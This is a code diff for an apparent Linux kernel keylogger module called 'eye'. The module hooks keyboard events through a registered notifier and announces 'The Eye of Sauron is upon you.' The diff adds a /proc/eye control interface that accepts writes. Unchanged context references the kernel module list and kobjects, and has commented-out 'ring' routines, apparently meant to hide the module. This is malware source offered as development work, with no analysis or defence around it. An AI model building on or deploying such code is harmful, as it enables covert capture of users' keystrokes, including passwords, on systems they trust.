@@ -1,14 +1,24 @@
 #include "eye.h"
+#include "ops.h"
 
 /* Kernel Module License */
 MODULE_AUTHOR("geno");
 MODULE_LICENSE("GPL");
 
 /* Global Variables */
+static struct proc_dir_entry *_ops;
 static struct list_head *_module_list = NULL;
 static struct kobject *_kobj          = NULL;
 static struct kobject *_kobj_parent   = NULL;
 static struct attribute_group *_kgrp  = NULL;
+static const struct file_operations fops = {
+    .owner      = THIS_MODULE,
+    .open       = ops_open,
+    .read       = seq_read,
+    .write      = ops_write,
+    .llseek     = seq_lseek,
+    .release    = single_release,
+};
 
 /* Funcion Prototypes */
 static int start_eye(void);
@@ -31,6 +41,7 @@ static int start_eye(void)
     register_keyboard_notifier(&_sauron);
     printk("The Eye of Sauron is upon you.\n");
 
+    _ops = proc_create("eye", 0, NULL, &fops);
 //    ring_on();
 
     return 0;
@@ -40,6 +51,9 @@ static void end_eye(void)
 {
 //    ring_off();
     unregister_keyboard_notifier(&_sauron);
+
+    remove_proc_entry("eye", NULL);
+
     printk("You are free from the Eye.\n");
 }
 
